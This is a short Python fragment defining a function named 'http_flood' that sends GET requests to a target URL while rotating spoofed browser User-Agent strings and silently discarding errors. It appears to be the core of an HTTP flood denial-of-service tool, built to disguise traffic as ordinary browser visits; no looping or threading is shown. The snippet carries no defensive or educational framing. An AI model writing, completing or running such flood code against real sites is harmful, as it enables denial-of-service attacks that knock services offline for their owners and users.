import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

def http_flood(target):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
    }
    try:
        requests.get(target, headers=headers, timeout=5)
    except:
        pass
